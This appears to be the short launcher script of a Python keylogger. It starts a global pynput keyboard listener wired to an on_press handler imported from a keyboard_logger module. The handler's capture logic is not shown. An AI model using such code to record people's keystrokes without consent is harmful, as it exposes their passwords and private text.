import threading
from pynput import keyboard
from keyboard_logger import on_press

listener = keyboard.Listener(on_press=on_press)

listener.start()